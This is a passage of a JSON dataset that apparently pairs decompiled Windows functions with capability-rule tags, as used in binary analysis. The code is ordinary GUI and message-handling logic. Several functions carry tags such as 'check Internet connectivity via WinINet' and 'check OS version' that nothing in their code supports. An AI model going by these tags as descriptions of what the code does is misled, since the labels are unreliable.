= NULL,  iVar9 != 0 &&\n                               (((*puVar14 != arg2 || (puVar14[1] != 0)) || (puVar15 = puVar14,  puVar14[2] != 0))));\n                            puVar14 = puVar14 + 8) {\n                            iVar9 = *(puVar14 + 0xc);\n                        }\n                        if (puVar15 != NULL) {\n                            *(uVar12 * 0x18 + 0x14004ffb8) = puVar15;\n                            fcn.140017020(7);\n                            goto code_r0x00014000dc1a;\n                        }\n                    }\n                    else {\n                        puVar14 = ppcVar7[1];\n                        while( true ) {\n                            iVar9 = *(puVar14 + 4);\n                            for (; (puVar15 = NULL,  iVar9 != 0 &&\n                                   (((*puVar14 != 0xc000 || (puVar14[1] != 0)) || (puVar15 = puVar14,  puVar14[2] != 0))\n                                   )); puVar14 = puVar14 + 8) {\n                                iVar9 = *(puVar14 + 0xc);\n                            }\n                            if (puVar15 == NULL) break;\n                            if (**(puVar15 + 4) == arg2) {\n                                *(uVar12 * 0x18 + 0x14004ffb8) = puVar15;\n                                fcn.140017020(7);\n                                goto code_r0x00014000e712;\n                            }\n                            puVar14 = puVar15 + 8;\n                        }\n                    }\n                    ppcVar7 = (*pcVar2)();\n                    pcVar2 = *ppcVar7;\n                } while( true );\n            }\n            puVar15 = *(uVar12 * 0x18 + 0x14004ffb8);\n            fcn.140017020(7);\n            if (puVar15 == NULL) {\n                return 0;\n            }\n            if (arg2 < 0xc000) {\ncode_r0x00014000dc1a:\n                uStack248 = 0x7fffffff;\n                pcVar2 = *(puVar15 + 6);\n                uVar12 = *(puVar15 + 4);\n                iVar3 = arg4 >> 0x10;\n                if (uVar12 < 0x25) {\n                    if (uVar12 == 0x24) {\n                        uVar6 = fcn.14000b398(arg4);\n                        (*pcVar2)(arg1, uVar6);\n                    }\n                    else if (uVar12 < 0x13) {\n                        if (uVar12 == 0x12) {\n                            (*pcVar2)(arg1, arg3, arg4);\n                        }\n                        else if (uVar12 < 10) {\n                            if (uVar12 == 9) {\n                                fcn.140006f44(auStack240);\n                                iStack232 = arg4[1];\n                                uStack264 = (*pcVar2)(arg1, auStack240, *(arg4 + 2));\n                                iStack232 = 0;\n                                fcn.140007598(auStack240);\n                            }\n                            else if (uVar12 == 1) {\n                                uVar6 = fcn.1400074d8(arg3);\n                                iVar4 = (*pcVar2)(arg1, uVar6);\n                                uStack264 = iVar4;\n                            }\n                            else if (uVar12 == 2) {\n                                iVar4 = (*pcVar2)(arg1, arg3 & 0xffffffff);\n                                uStack264 = iVar4;\n                            }\n                            else if (uVar12 == 3) {\n                                iVar4 = (*pcVar2)(arg1, arg3 & 0xffffffff);\n                                uStack264 = iVar4;\n                            }\n                            else if (uVar12 == 4) {\n                                iVar4 = (*pcVar2)(arg1, arg3);\n                                uStack264 = iVar4;\n                            }\n                            else if (uVar12 == 5) {\n                                uVar6 = fcn.14000b398(arg3);\n                                iVar4 = (*pcVar2)(arg1, uVar6, arg4 & 0xffff, arg4 >> 0x10 & 0xffff);\n                                uStack264 = iVar4;\n                            }\n                            else if (uVar12 == 6) {\n                                uVar6 = fcn.14000b398(arg3);\n                                iVar4 = (*pcVar2)(arg1, uVar6, arg4);\n                                uStack264 = iVar4;\n                            }\n                            else if (uVar12 == 7) {\n                                iVar4 = (*pcVar2)(arg1, arg4);\n                                uStack264 = iVar4;\n                            }\n                            else if (uVar12 == 8) {\n                                fcn.140006f44(auStack240);\n                                iStack232 = arg4[1];\n                                fcn.140009874(auStack200);\n                                iStack136 = *arg4;\n                                uVar1 = *(arg4 + 2);\n                                puVar8 = fcn.14000b3dc(iStack136);\n                                if (puVar8 == NULL) {\n                                    if ((arg1[0x13] != 0) &&\n                                       (iVar9 = fcn.140015944(arg1[0x13] + 0x48, iStack136),  iVar9 != 0)) {\n                                        iStack40 = iVar9;\n                                    }\n                                    puVar8 = auStack200;\n                                }\n                                uStack264 = (*pcVar2)(arg1, auStack240, puVar8, uVar1);\n                                iStack232 = 0;\n                                iStack136 = 0;\n                                fcn.14000be40(auStack200);\n                                fcn.140007598(auStack240);\n                            }\n                        }\n                        else if (uVar12 == 10) {\n                            uVar6 = fcn.14000b398(arg4);\n                            iVar4 = (*pcVar2)(arg1, arg3 & 0xffff, uVar6, arg3 >> 0x10 & 0xffff);\n                            uStack264 = iVar4;\n                        }\n                        else if (uVar12 == 0xb) {\n                            iVar4 = (*pcVar2)(arg1, arg3 & 0xffff, arg3 >> 0x10 & 0xffff);\n                            uStack264 = iVar4;\n                        }\n                        else if (uVar12 == 0xc) {\n                            uVar6 = fcn.14000b398(arg3);\n                            iVar4 = (*pcVar2)(arg1, uVar6, arg4 & 0xffff, arg4 >> 0x10 & 0xffff);\n                            uStack264 = iVar4;\n                        }\n                        else if (uVar12 == 0xd) {\n                            iVar4 = (*pcVar2)(arg1, arg4);\n                            uStack264 = iVar4;\n                        }\n                        else if (uVar12 == 0xe) {\n                            uStack264 = (*pcVar2)(arg1, arg3, arg4);\n                        }\n                        else if (uVar12 == 0xf) {\n                            uVar6 = fcn.140016df8(arg4);\n                            uStack264 = (*pcVar2)(arg1, arg3 & 0xffff, arg3 >> 0x10 & 0xffff, uVar6);\n                        }\n                        else if (uVar12 == 0x10) {\n                            (*pcVar2)(arg1, arg3 & 0xffffffff, arg4);\n                        }\n                        else if (uVar12 == 0x11) {\n                            (*pcVar2)(arg1, arg3);\n                        }\n                    }\n                    else if (uVar12 < 0x1c) {\n                        if (uVar12 == 0x1b) {\n                            iVar4 = (*pcVar2)(arg1, arg3 & 0xffffffff);\n                            uStack264 = iVar4;\n                        }\n                        else if (uVar12 == 0x13) {\n                            (*pcVar2)(arg1);\n                        }\n                        else if (uVar12 == 0x14) {\n                            (*pcVar2)(arg1, arg3 & 0xffffffff);\n                        }\n                        else if (uVar12 == 0x15) {\n                            (*pcVar2)(arg1, arg3 & 0xffffffff, arg4 & 0xffffffff);\n                        }\n                        else if (uVar12 == 0x16) {\n                            (*pcVar2)(arg1, arg3 & 0xffff, arg3 >> 0x10 & 0xffff);\n                        }\n                        else if (uVar12 == 0x17) {\n                            (*pcVar2)(arg1, iVar13, iVar3);\n                        }\n                        else if (uVar12 == 0x18) {\n                            (*pcVar2)(arg1, arg3 & 0xffffffff, arg4 & 0xffff, arg4 >> 0x10 & 0xffff);\n                        }\n                        else if (uVar12 == 0x19) {\n                            (*pcVar2)(arg1, arg3 & 0xffffffff, arg4 & 0xffff, arg4 >> 0x10 & 0xffff);\n                        }\n                        else if (uVar12 == 0x1a) {\n                            uVar6 = fcn.14000b398(arg4);\n                            (*pcVar2)(arg1, arg3 & 0xffffffff, uVar6);\n                        }\n                    }\n                    else if (uVar12 == 0x1c) {\n                        uVar5 = (*pcVar2)(arg1, arg3 & 0xffffffff);\n                        uStack264 = uVar5;\n                    }\n                    else if (uVar12 == 0x1d) {\n                        iVar4 = (*pcVar2)(arg1);\n                        uStack264 = iVar4;\n                    }\n                    else if (uVar12 == 0x1e) {\n                        (*pcVar2)(arg1, arg3, arg4);\n                    }\n                    else if (uVar12 == 0x1f) {\n                        uVar6 = fcn.14000b398(arg3);\n                        uVar10 = fcn.14000b398(arg4);\n                        (*pcVar2)(arg1, arg1[8] == arg4, uVar10, uVar6);\n                    }\n                    else if (uVar12 == 0x20) {\n                        uVar6 = fcn.1400074d8(arg3);\n                        (*pcVar2)(arg1, uVar6);\n                    }\n                    else if (uVar12 == 0x21) {\n                        uVar6 = fcn.140016df8(arg3);\n                        (*pcVar2)(arg1, uVar6);\n                    }\n                    else if (uVar12 == 0x22) {\n                        uVar6 = fcn.140016df8(arg3);\n                        (*pcVar2)(arg1, uVar6, iVar13, iVar3);\n                    }\n                    else if (uVar12 == 0x23) {\n                        uVar6 = fcn.14000b398(arg3);\n                        (*pcVar2)(arg1, uVar6);\n                    }\n                }\n                else if (uVar12 < 0x38) {\n                    if (uVar12 == 0x37) {\n                        iStack256 = iVar13;\n                        iStack252 = iVar3;\n                        iVar4 = (*pcVar2)(arg1, arg3 & 0xffff, arg3 >> 0x10, CONCAT44(iStack252, iStack256));\n                        uStack264 = iVar4;\n                        if (uStack264 == 0) {\n                            return 0;\n                        }\n                    }\n                    else if (uVar12 < 0x2f) {\n                        if (uVar12 == 0x2e) {\n                            (*pcVar2)(arg1, arg3 & 0xffffffff, arg4);\n                            uStack264 = 1;\n                        }\n                        else if (uVar12 == 0x25) {\n                            uVar6 = fcn.14000b398(arg3);\n                            (*pcVar2)(arg1, uVar6, arg4 & 0xffff, arg4 >> 0x10 & 0xffff);\n                        }\n                        else if (uVar12 == 0x26) {\n                            iStack256 = iVar13;\n                            iStack252 = iVar3;\n                            uVar6 = fcn.14000b398(arg3);\n                            (*pcVar2)(arg1, uVar6, CONCAT44(iStack252, iStack256));\n                        }\n                        else if (uVar12 == 0x27) {\n                            uVar6 = fcn.14000b398(arg3);\n                            (*pcVar2)(arg1, uVar6, arg4);\n                        }\n                        else if (uVar12 == 0x28) {\n                            uStack264 = (*pcVar2)(arg1);\n                        }\n                        else if (uVar12 == 0x29) {\n                            uVar6 = fcn.14000b398(arg4);\n                            (*pcVar2)(arg1, arg3 & 0xffff, uVar6, arg3 >> 0x10 & 0xffff);\n                        }\n                        else if (0x29 < uVar12) {\n                            if (uVar12 < 0x2c) {\n                                iVar4 = arg3 >> 0x10;\n                                if (uVar12 == 0x2a) {\n                                    uVar6 = fcn.14000b398(arg4);\n                                    (*pcVar2)(arg1, arg3, iVar4, uVar6);\n                                }\n                                else {\n                                    (*pcVar2)(arg1, arg3, iVar4);\n                                }\n                            }\n                            else if (uVar12 == 0x2c) {\n                                (*pcVar2)(arg1, arg4);\n                            }\n                            else if (uVar12 == 0x2d) {\n                                (*pcVar2)(arg1, arg3 & 0xffffffff, arg4);\n                            }\n                        }\n                    }\n                    else if (uVar12 == 0x2f) {\n                        iVar4 = (*pcVar2)(arg1, arg3 & 0xffffffff, arg4);\n                        uStack264 = iVar4;\n                    }\n                    else if (uVar12 == 0x30) {\n                        iStack256 = iVar13;\n                        iStack252 = iVar3;\n                        uVar5 = (*pcVar2)(arg1, CONCAT44(iStack252, iStack256));\n                        uStack264 = uVar5;\n                    }\n                    else if (uVar12 == 0x31) {\n                        uVar5 = (*pcVar2)(arg1);\n                        uStack264 = uVar5;\n                    }\n                    else if (uVar12 == 0x32) {\n                        (*pcVar2)(arg1, arg3 & 0xffffffff, arg4);\n                    }\n                    else if (uVar12 == 0x33) {\n                        (*pcVar2)(arg1, arg4);\n                    }\n                    else if (uVar12 == 0x34) {\n                        (*pcVar2)(arg1, arg3 & 0xffff, arg3 >> 0x10 & 0xffff, arg4);\n                    }\n                    else if (uVar12 == 0x35) {\n                        iStack256 = iVar13;\n                        iStack252 = iVar3;\n                        (*pcVar2)(arg1, arg3 & 0xffffffff, CONCAT44(iStack252, iStack256));\n                    }\n                    else if (uVar12 == 0x36) {\n                        (*pcVar2)(arg1, arg3 & 0xffffffff, arg4);\n                        uStack264 = 1;\n                    }\n                }\n                else if (uVar12 < 0x4d) {\n                    if (uVar12 == 0x4c) {\n                        (*pcVar2)(arg1, arg3 & 0xffffffff, arg4);\n                    }\n                    else if (uVar12 == 0x38) {\n                        iStack256 = iVar13;\n                        iStack252 = iVar3;\n                        (*pcVar2)(arg1, arg3 & 0xffff, arg3 >> 0x10, CONCAT44(iStack252, iStack256));\n                    }\n                    else if (uVar12 == 0x45) {\n                        uStack264 = (*pcVar2)(arg1);\n                        if (uStack264 != 0) {\n                            return 0;\n                        }\n                    }\n                    else if (uVar12 == 0x46) {\n                        iStack256 = iVar13;\n                        iStack252 = iVar3;\n                        uStack264 = (*pcVar2)(arg1, CONCAT44(iStack252, iStack256));\n                    }\n                    else if (uVar12 == 0x47) {\n                        uVar6 = fcn.14000b398(arg3);\n                        uVar5 = (*pcVar2)(arg1, uVar6, arg4 & 0xffffffff);\n                        uStack264 = uVar5;\n                    }\n                    else if (uVar12 == 0x48) {\n                        uVar6 = fcn.140016df8(arg4);\n                        (*pcVar2)(arg1, arg3 & 0xffffffff, uVar6);\n                    }\n                    else if (uVar12 == 0x49) {\n                        uVar6 = fcn.140016df8(arg4);\n                        uVar5 = (*pcVar2)(arg1, arg3 & 0xffffffff, uVar6);\n                        uStack264 = uVar5;\n                    }\n                    else if (uVar12 == 0x4a) {\n                        uVar5 = (*pcVar2)(arg1, arg4);\n                        uStack264 = uVar5;\n                    }\n                    else if (uVar12 == 0x4b) {\n                        uVar6 = fcn.140016df8(arg3);\n                        (*pcVar2)(arg1, uVar6, arg4 & 0xffffffff);\n                    }\n                }\n                else if (uVar12 == 0x4d) {\n                    uVar5 = arg4 >> 0x10;\n                    uVar6 = fcn.14000b398(arg3);\n                    (*pcVar2)(arg1, uVar6, uVar5 & 0xfff, uVar5 & 0xf000, \n                              in_stack_fffffffffffffee8 & 0xffffffff00000000 | arg4 & 0xffff);\n                    uStack264 = 1;\n                }\n                else if (uVar12 == 0x4e) {\n                    (*pcVar2)(arg1, arg3 & 0xff, arg4);\n                }\n                else if (uVar12 == 0x4f) {\n                    uVar5 = (*pcVar2)(arg1, arg3 & 0xffffffff, arg4 & 0xffffffff);\n                    uStack264 = uVar5;\n                }\n                else if (uVar12 == 0x50) {\n                    iStack256 = iVar13;\n                    iStack252 = iVar3;\n                    (*pcVar2)(arg1, arg3 & 0xffff, arg3 >> 0x10 & 0xffff, CONCAT44(iStack252, iStack256));\n                    uStack264 = 1;\n                }\n                else if (uVar12 == 0x51) {\n                    iStack256 = iVar13;\n                    iStack252 = iVar3;\n                    (*pcVar2)(arg1, arg3 & 0xffff, arg3 >> 0x10 & 0xffff, CONCAT44(iStack252, iStack256));\n                    uStack264 = 1;\n                }\n                else if (uVar12 == 0x52) {\n                    (*pcVar2)(arg1, uVar11 & 0xffffffffffffff00 | arg3 & 0xff, arg4 & 0xffffffff);\n                    uStack264 = 1;\n                }\n                else if (uVar12 == 0x53) {\n                    (*pcVar2)(arg1, arg3 & 0xffffffff, arg4);\n                }\n                else if (uVar12 == 0x54) {\n                    (*pcVar2)(arg1, arg3 & 0xffff);\n                }\n            }\n            else {\ncode_r0x00014000e712:\n                uStack248 = 0x7fffffff;\n                uStack264 = (**(puVar15 + 6))(arg1, arg3, arg4);\n            }\n        }\n    }\ncode_r0x00014000e727:\n    if (in_stack_00000028 != NULL) {\n        *in_stack_00000028 = uStack264;\n    }\n    return 1;\n}\n",
        "token_count": 5453
    },
    "14000eb3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.14000eb3c(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t iVar1;\n    int64_t *in_stack_00000028;\n    \n    if (*(arg1 + 0xa0) == 0) {\n        iVar1 = fcn.14000e77c(arg1, arg2, arg3, arg4);\n    }\n    else {\n        iVar1 = (*_sym.imp.USER32.dll_SendMessageA)(*(arg1 + 0x40), arg2 + 0x2000);\n        if ((6 < arg2 - 0x132U) || (iVar1 != 0)) {\n            if (in_stack_00000028 != NULL) {\n                *in_stack_00000028 = iVar1;\n            }\n            iVar1 = 1;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 196
    },
    "14000f61": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.14000f610(int64_t *arg1, uint64_t arg2, ulong arg3, int64_t arg4)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    ulong *puVar5;\n    code **ppcVar6;\n    uint32_t uVar7;\n    int64_t *piVar8;\n    ulong in_stack_00000028;\n    \n    arg2 = arg2 & 0xffffffff;\n    if (arg3 == 0xfffffffe) {\n        iVar3 = fcn.140006c48();\n        if (*(iVar3 + 0x68) != 0) {\n            iVar3 = fcn.140006c48();\n            uVar4 = (**(**(iVar3 + 0x68) + 8))(*(iVar3 + 0x68), arg1, arg2, arg4, in_stack_00000028);\n            return uVar4;\n        }\n        fcn.140005e30();\n        pcVar1 = swi(3);\n        uVar4 = (*pcVar1)();\n        return uVar4;\n    }\n    if (arg3 == 0xfffffffd) {\n        uVar7 = 0;\n        if (arg4 == 0) {\n            fcn.140005e30();\n            pcVar1 = swi(3);\n            uVar4 = (*pcVar1)();\n            return uVar4;\n        }\n        iVar3 = *(arg4 + 0x50);\n        puVar5 = (**(*arg1 + 0x58))();\n        do {\n            if ((puVar5 == NULL) || (uVar7 != 0)) {\n                return uVar7;\n            }\n            piVar8 = puVar5[1];\n            while (((*(piVar8 + 1) != 0 && (*(piVar8 + 0xc) != 0)) && (uVar7 == 0))) {\n                if (arg2 == *(piVar8 + 1)) {\n                    if (iVar3 == 0) {\n                        if (*piVar8 == 0) {\ncode_r0x00014000f6de:\n                            uVar7 = 1;\n                            *(arg4 + 8) = *(piVar8 + 0xc);\n                        }\n                    }\n                    else if ((*piVar8 != 0) && (iVar2 = fcn.14001c640(iVar3, *piVar8, 0x10),  iVar2 == 0))\n                    goto code_r0x00014000f6de;\n                }\n                piVar8 = piVar8 + 2;\n            }\n            puVar5 = *puVar5;\n        } while( true );\n    }\n    uVar7 = arg3;\n    if (arg3 != 0xffffffff) {\n        uVar7 = arg3 & 0xffff;\n        uVar4 = arg3 >> 0x10;\n        if (arg3 >> 0x10 != 0) goto code_r0x00014000f71c;\n    }\n    uVar4 = 0x111;\ncode_r0x00014000f71c:\n    ppcVar6 = (**(*arg1 + 0x50))();\n    while( true ) {\n        if (*ppcVar6 == NULL) {\n            return 0;\n        }\n        iVar3 = fcn.140008ddc(ppcVar6[1], uVar4, uVar7, arg2);\n        if (iVar3 != 0) break;\n        ppcVar6 = (**ppcVar6)();\n    }\n    uVar4 = fcn.14000f48c(arg1, arg2, uVar7, *(iVar3 + 0x18));\n    return uVar4;\n}\n",
        "token_count": 829
    },
    "14001041": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140010414(int64_t arg1)\n\n{\n    ulong uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int16_t iVar4;\n    uchar auStack88 [32];\n    int16_t *piStack56;\n    int16_t aiStack40 [4];\n    int16_t aiStack32 [4];\n    uint64_t uStack24;\n    \n    uStack24 = *0x14003e1a0 ^ auStack88;\n    fcn.140016f8c(5);\n    if (*0x140053338 == 0) {\n        if (*0x140053320 == 0) {\n            iVar4 = 0x1111;\n            iVar3 = 0;\n            do {\n                aiStack40[iVar3] = iVar4;\n                aiStack32[iVar3] = iVar4;\n                iVar3 = iVar3 + 1;\n                iVar4 = iVar4 * 2;\n            } while (iVar3 < 4);\n            piStack56 = aiStack40;\n            iVar3 = (*_sym.imp.GDI32.dll_CreateBitmap)(8, 8, 1);\n            if (iVar3 == 0) {\n                fcn.140017020(5);\n                fcn.140006ee8();\n            }\n            *0x140053320 = (*_sym.imp.GDI32.dll_CreatePatternBrush)(iVar3);\n            (*_sym.imp.GDI32.dll_DeleteObject)();\n            if (*0x140053320 == 0) {\n                fcn.140017020(5);\n                fcn.140006ee8();\n            }\n        }\n        if (*0x140053328 == 0) {\n            *0x140053328 = (*_sym.imp.GDI32.dll_CreatePen)(2, 0, 0);\n            if (*0x140053328 == 0) {\n                fcn.140017020(5);\n                fcn.140006ee8();\n            }\n        }\n        iVar3 = fcn.140006c48();\n        uVar1 = *(iVar3 + 0x18);\n        *0x1400532d0 = (*_sym.imp.USER32.dll_LoadCursorA)(uVar1, 0x7907);\n        *0x1400532d8 = (*_sym.imp.USER32.dll_LoadCursorA)(uVar1, 0x7908);\n        *0x1400532e0 = *0x1400532d0;\n        *0x1400532e8 = *0x1400532d8;\n        *0x1400532f0 = (*_sym.imp.USER32.dll_LoadCursorA)(uVar1, 0x7909);\n        *0x1400532f8 = (*_sym.imp.USER32.dll_LoadCursorA)(uVar1, 0x790a);\n        *0x140053300 = *0x1400532f0;\n        *0x140053308 = *0x1400532f8;\n        *0x140053310 = (*_sym.imp.USER32.dll_LoadCursorA)(uVar1, 0x790b);\n        *0x140053318 = (*_sym.imp.USER32.dll_LoadCursorA)(uVar1, 0x790c);\n        *0x140053330 = (*_sym.imp.KERNEL32.dll_GetProfileIntA)(\"windows\", \"oleinplaceborderwidth\", 4);\n        *0x140053338 = 1;\n    }\n    if (*0x140053334 == '\\0') {\n        iVar2 = fcn.14001b57c();\n        *0x140053334 = iVar2 == 0;\n    }\n    fcn.140017020(5);\n    *(arg1 + 8) = 0;\n    *(arg1 + 0x24) = *0x140053330;\n    iVar2 = *0x140053330 * 2;\n    *(arg1 + 0x1c) = iVar2;\n    *(arg1 + 0x20) = iVar2;\n    (*_sym.imp.USER32.dll_SetRectEmpty)(arg1 + 0x2c);\n    *(arg1 + 0x40) = 0;\n    *(arg1 + 0x3c) = 0;\n    *(arg1 + 0x44) = 0;\n    *(arg1 + 0x48) = 0;\n    fcn.14001b410(uStack24 ^ auStack88);\n    return;\n}\n",
        "token_count": 976
    },
    "140010e4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint64_t fcn.140010e40(int64_t *arg1, ulong arg2, int64_t arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    bool bVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    ulong uVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    int32_t iStackX32;\n    int32_t iStackX36;\n    int64_t in_stack_00000028;\n    ulong lprc1;\n    int32_t *piVar8;\n    int32_t *piVar9;\n    int32_t iStack168;\n    int32_t iStack164;\n    int32_t iStack160;\n    int32_t iStack156;\n    ulong uStack152;\n    ulong uStack144;\n    int32_t *piStack136;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    int32_t *piStack112;\n    uchar auStack104 [8];\n    int32_t iStack96;\n    int64_t iStack88;\n    int16_t iStack80;\n    unkbyte6 Stack78;\n    \n    iVar4 = (*_sym.imp.USER32.dll_GetCapture)();\n    if (iVar4 == 0) {\n        fcn.140016124();\n        iStack160 = *(arg1 + 0x14) - *(arg1 + 0xc);\n        iStack156 = *(arg1 + 3) - *(arg1 + 2);\n        uVar5 = (*_sym.imp.USER32.dll_SetCapture)(*(arg3 + 0x40));\n        fcn.14000b398(uVar5);\n        (*_sym.imp.USER32.dll_UpdateWindow)(*(arg3 + 0x40));\n        if (in_stack_00000028 != 0) {\n            (*_sym.imp.USER32.dll_UpdateWindow)(*(in_stack_00000028 + 0x40));\n        }\n        uStack128 = *(arg1 + 0xc);\n        uStack124 = *(arg1 + 2);\n        uStack120 = *(arg1 + 0x14);\n        uStack116 = *(arg1 + 3);\n        piVar9 = &iStack164;\n        piVar8 = &iStack168;\n        fcn.140010b54(arg1, arg2, &piStack112, &piStack136);\n        iStackX32 = arg4;\n        iStack168 = iStackX32 - iStack168;\n        iStackX36 = arg4 >> 0x20;\n        iStack164 = iStackX36 - iStack164;\n        if (in_stack_00000028 == 0) {\n            uVar5 = (*_sym.imp.USER32.dll_GetDC)(*(arg3 + 0x40));\n        }\n        else {\n            uVar5 = (*_sym.imp.USER32.dll_GetDCEx)(*(in_stack_00000028 + 0x40), 0, 2);\n        }\n        iVar4 = fcn.1400074d8(uVar5);\n        if (iVar4 == 0) {\n            fcn.140005e30();\n            pcVar1 = swi(3);\n            uVar6 = (*pcVar1)();\n            return uVar6;\n        }\n        bVar2 = false;\n        (*_sym.imp.USER32.dll_GetMessageA)(auStack104, 0, 0, 0, piVar8, piVar9);\n        uVar5 = (*_sym.imp.USER32.dll_GetCapture)();\n        iVar7 = fcn.14000b398(uVar5);\n        while (iVar7 == arg3) {\n            if (iStack96 == 0x100) {\n                if (iStack88 == 0x1b) {\ncode_r0x000140011100:\n                    if (bVar2) {\n                        *(arg1 + 9) = 1;\n                        *(arg1 + 0x44) = 1;\n                        (***arg1)(arg1, arg1 + 0xc, in_stack_00000028, iVar4, arg3);\n                    }\n                    *(arg1 + 0xc) = uStack128;\n                    *(arg1 + 2) = uStack124;\n                    *(arg1 + 0x14) = uStack120;\n                    *(arg1 + 3) = uStack116;\n                    break;\n                }\n            }\n            else if ((iStack96 == 0x200) || (iStack96 == 0x202)) {\n                uStack152 = *(arg1 + 0xc);\n                uStack144 = *(arg1 + 0x14);\n                if (piStack112 != NULL) {\n                    *piStack112 = iStack80 - iStack168;\n                }\n                if (piStack136 != NULL) {\n                    *piStack136 = Stack78 - iStack164;\n                }\n                if (arg2 == 8) {\n                    *(arg1 + 0x14) = iStack160 + *(arg1 + 0xc);\n                    *(arg1 + 3) = iStack156 + *(arg1 + 2);\n                }\n                (**(*arg1 + 8))(uStack152, arg1, arg2, arg1 + 0xc);\n                *(arg1 + 9) = iStack96 == 0x202;\n                iVar3 = (*_sym.imp.USER32.dll_EqualRect)(&uStack152, arg1 + 0xc);\n                if ((iVar3 == 0) || (*(arg1 + 9) != 0)) {\n                    if (bVar2) {\n                        *(arg1 + 0x44) = 1;\n                        (***arg1)(arg1, &uStack152, in_stack_00000028, iVar4, arg3);\n                    }\n                    (**(*arg1 + 0x10))(arg1, &uStack152);\n                    if (iStack96 != 0x202) {\n                        bVar2 = true;\n                    }\n                    if (*(arg1 + 9) != 0) break;\n                }\n                iVar3 = (*_sym.imp.USER32.dll_EqualRect)(&uStack152);\n                if (iVar3 == 0) {\n                    *(arg1 + 0x44) = 0;\n                    (***arg1)(arg1, arg1 + 0xc, in_stack_00000028, iVar4, arg3);\n                }\n            }\n            else {\n                if (iStack96 == 0x204) goto code_r0x000140011100;\n                (*_sym.imp.USER32.dll_DispatchMessageA)(auStack104);\n            }\n            (*_sym.imp.USER32.dll_GetMessageA)(auStack104, 0, 0, 0);\n            uVar5 = (*_sym.imp.USER32.dll_GetCapture)();\n            iVar7 = fcn.14000b398(uVar5);\n        }\n        if (in_stack_00000028 == 0) {\n            uVar5 = *(arg3 + 0x40);\n        }\n        else {\n            uVar5 = *(in_stack_00000028 + 0x40);\n        }\n        (*_sym.imp.USER32.dll_ReleaseDC)(uVar5, *(iVar4 + 8));\n        (*_sym.imp.USER32.dll_ReleaseCapture)();\n        fcn.1400163ec(0);\n        if (!bVar2) {\n            *(arg1 + 0xc) = CONCAT44(uStack124, uStack128);\n            *(arg1 + 0x14) = CONCAT44(uStack116, uStack120);\n        }\n        *(arg1 + 9) = 0;\n        *(arg1 + 0x44) = 0;\n        iVar3 = (*_sym.imp.USER32.dll_EqualRect)(&uStack128, arg1 + 0xc);\n        uVar6 = iVar3 == 0;\n    }\n    else {\n        uVar6 = 0;\n    }\n    return uVar6;\n}\n",
        "token_count": 1736
    },
    "14001125": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140011258(ulong arg1)\n\n{\n    int32_t iVar1;\n    int64_t *piVar2;\n    \n    piVar2 = fcn.14001276c();\n    if (piVar2 == NULL) {\n        piVar2 = NULL;\n    }\n    else {\n        piVar2 = (**(*piVar2 + 0xe8))(piVar2);\n    }\n    if (piVar2 != NULL) {\n        iVar1 = (**(*piVar2 + 0x250))(piVar2);\n        if ((iVar1 != 0) && (piVar2[0x1c] != 0)) {\n            (**(*piVar2[0x1c] + 200))(piVar2[0x1c], arg1);\n        }\n    }\n    return;\n}\n",
        "token_count": 178
    },
    "1400113c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
